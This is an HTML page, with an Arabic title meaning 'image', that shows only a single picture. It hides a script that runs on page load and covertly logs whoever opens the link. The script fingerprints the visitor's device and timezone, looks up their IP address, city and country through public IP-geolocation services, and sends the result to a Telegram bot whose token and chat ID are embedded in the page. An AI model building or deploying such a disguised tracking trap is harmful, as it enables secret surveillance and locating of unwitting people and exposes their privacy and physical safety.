<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صورة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .image-container {
            max-width: 100%;
            max-height: 100vh;
            overflow: hidden;
        }
        
        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>

    <div class="image-container">
        <img src="zer.jpg" alt="صورة">
    </div>

    <script>
        // دالة تحديد نوع الشركة والجهاز بشكل عام وديناميكي
        function getExactDeviceName(ua) {
            if (/Android/.test(ua)) {
                let brand = "Android (شركة غير معروفة)";
                let modelCode = "غير محدد";

                const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
                if (androidMatch) {
                    modelCode = androidMatch[1].trim();
                    
                    let lowerUA = ua.toLowerCase();
                    let lowerModel = modelCode.toLowerCase();

                    if (lowerUA.includes("samsung") || lowerModel.startsWith("sm-")) {
                        brand = "Samsung";
                    } else if (lowerUA.includes("huawei") || lowerUA.includes("honor") || lowerModel.startsWith("hwn")) {
                        brand = "Huawei / Honor";
                    } else if (lowerUA.includes("xiaomi") || lowerUA.includes("redmi") || lowerUA.includes("poco") || lowerUA.includes("mi ")) {
                        brand = "Xiaomi";
                    } else if (lowerUA.includes("oppo") || lowerModel.startsWith("cph")) {
                        brand = "Oppo";
                    } else if (lowerUA.includes("vivo")) {
                        brand = "Vivo";
                    } else if (lowerUA.includes("oneplus")) {
                        brand = "OnePlus";
                    } else if (lowerUA.includes("realme")) {
                        brand = "Realme";
                    } else if (lowerUA.includes("google") || lowerModel.includes("pixel")) {
                        brand = "Google Pixel";
                    } else if (lowerUA.includes("sony")) {
                        brand = "Sony";
                    }
                }
                return `${brand} [الموديل: ${modelCode}]`;
            }

            if (/iPhone|iPad/.test(ua)) {
                const width = window.screen.width;
                const height = window.screen.height;

                if (width === 430 && height === 932) return 'iPhone 15 Pro Max / 14 Pro Max';
                if (width === 393 && height === 852) return 'iPhone 15 Pro / 15 / 14 Pro';
                if (width === 428 && height === 926) return 'iPhone 14 Plus / 13 Pro Max';
                if (width === 390 && height === 844) return 'iPhone 14 / 13 Pro / 13 / 12 Pro / 12';
                if (width === 414 && height === 896) return 'iPhone 11 / XR / XS Max';
                if (width === 375 && height === 812) return 'iPhone 13 mini / 12 mini / 11 Pro / X / XS';
                if (width === 375 && height === 667) return 'iPhone SE / 8 / 7';
                
                return 'iPhone / iPad';
            }

            if (/Windows NT 10.0/.test(ua)) return 'كمبيوتر (Windows 10/11)';
            if (/Macintosh/.test(ua)) return 'جهاز Mac';
            if (/Linux/.test(ua)) return 'جهاز Linux (كمبيوتر)';

            return 'جهاز غير معروف';
        }

        async function trackVisitor() {
            try {
                let ipAddress = 'غير قادر على الجلب';
                let deviceInfo = navigator.userAgent;
                let location = 'غير معروف';
                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                let exactDeviceName = getExactDeviceName(deviceInfo);
                
                try {
                    const ipResponse = await fetch('https://ipwho.is/');
                    if (ipResponse.ok) {
                        const ipData = await ipResponse.json();
                        ipAddress = ipData.ip;
                        location = `${ipData.city}، ${ipData.country}`;
                    }
                } catch (e1) {
                    try {
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        if (ipResponse.ok) {
                            const ipData = await ipResponse.json();
                            ipAddress = ipData.ip;
                        }
                        const locResponse = await fetch('https://geolocation-db.com/json/');
                        if (locResponse.ok) {
                            const locData = await locResponse.json();
                            location = `${locData.city}، ${locData.country_name}`;
                        }
                    } catch (e2) {
                        console.log('فشلت الـ APIs في العمل');
                    }
                }
                
                // التعديل الجديد: حساب الوقت بناءً على توقيت الجزائر (توقيت وسط أوروبا GMT+1)
                const timestamp = new Date().toLocaleString('ar-DZ', { timeZone: 'Africa/Algiers' });
                
                // صياغة الرسالة المرسلة للتليجرام
                const message = `🚨 زائر جديد فتح الرابط!\n\n📱 الجهاز: ${exactDeviceName}\n📍 الموقع: ${location}\n🌍 IP Address: ${ipAddress}\n⏰ الوقت (بتوقيت الجزائر): ${timestamp}\n🕐 المنطقة الزمنية لجهاز الزائر: ${timezone}\n\nℹ️ السطر الخام (User Agent):\n${deviceInfo}`;
                
                const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
                const chatId = '1802530770';
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                console.log('✅ تم الإرسال لتلجرام بنجاح بتوقيت الجزائر');
                
            } catch (error) {
                console.log('خطأ في التنفيذ:', error);
            }
        }
        
        window.addEventListener('load', trackVisitor);
    </script>
</body>
</html>
